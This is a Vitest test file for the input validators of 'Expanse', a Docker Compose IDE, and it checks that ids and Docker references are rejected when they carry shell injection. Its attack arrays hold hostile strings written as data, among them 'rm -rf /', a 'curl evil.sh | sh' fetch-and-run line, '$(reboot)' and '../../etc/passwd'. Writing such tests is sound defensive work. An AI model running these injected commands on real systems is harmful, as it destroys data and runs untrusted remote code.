/**
 * Expanse — IDE visual de Docker Compose
 * Programa de Dinámicas Electrónicas
 * Contacto: dinamicas.electronicas@gmail.com
 * Copyright (c) 2026 Dinámicas Electrónicas <dinamicas.electronicas@gmail.com>
 *
 * Este archivo es parte de Expanse y se distribuye bajo la licencia MIT.
 * Consulta el archivo LICENSE en la raíz del proyecto.
 */

import { describe, expect, it } from 'vitest';
import {
  assertComposeId,
  assertDockerIdList,
  assertDockerReference,
  composeProjectName,
  composeWorkDir,
} from '@/lib/dockerExec';

const VALID_ID = '6aff14b3f3ec933fa297d865';

describe('assertComposeId', () => {
  it('accepts a 24 char hex ObjectId', () => {
    expect(assertComposeId(VALID_ID)).toBe(VALID_ID);
    expect(assertComposeId(VALID_ID.toUpperCase())).toBe(VALID_ID.toUpperCase());
    expect(assertComposeId(` ${VALID_ID} `)).toBe(VALID_ID);
  });

  it('rejects shell metacharacters and path traversal', () => {
    const attacks = [
      'abc; rm -rf /',
      '$(whoami)',
      '../../etc/passwd',
      `${VALID_ID} && curl evil.sh | sh`,
      '6aff14b3f3ec933fa297d86',
      '',
      'null',
    ];
    for (const attack of attacks) {
      expect(() => assertComposeId(attack)).toThrow('Invalid compose id');
    }
  });
});

describe('composeProjectName / composeWorkDir', () => {
  it('builds a stable project name and temp dir for valid ids', () => {
    expect(composeProjectName(VALID_ID)).toBe(`expanse-project_${VALID_ID}`);
    expect(composeWorkDir(VALID_ID).endsWith(`/expanse-${VALID_ID}`)).toBe(true);
  });

  it('never builds paths from unvalidated input', () => {
    expect(() => composeWorkDir('../../root')).toThrow();
    expect(() => composeProjectName('x;y')).toThrow();
  });
});

describe('assertDockerReference', () => {
  it('accepts container ids, image refs, volume and project names', () => {
    expect(assertDockerReference('a1b2c3d4e5f6')).toBe('a1b2c3d4e5f6');
    expect(assertDockerReference('docker.io/library/nginx:1.27-alpine')).toBe('docker.io/library/nginx:1.27-alpine');
    expect(assertDockerReference('postgres_data')).toBe('postgres_data');
    expect(assertDockerReference('expanse-project_6aff14b3f3ec933fa297d865')).toBe(
      'expanse-project_6aff14b3f3ec933fa297d865',
    );
    expect(assertDockerReference('redis@sha256:abc123')).toBe('redis@sha256:abc123');
  });

  it('rejects flag injection, whitespace and shell syntax', () => {
    const attacks = [
      '-rf',
      '--force',
      'a b',
      'a;b',
      'a|b',
      'a$(b)',
      'a`b`',
      'a&&b',
      '',
      'x'.repeat(256),
    ];
    for (const attack of attacks) {
      expect(() => assertDockerReference(attack)).toThrow();
    }
  });
});

describe('assertDockerIdList', () => {
  it('splits docker CLI output into validated references', () => {
    expect(assertDockerIdList('abc123\ndef456\n')).toEqual(['abc123', 'def456']);
  });

  it('rejects lists that contain an unsafe entry', () => {
    expect(() => assertDockerIdList('abc123 $(reboot)')).toThrow();
  });
});
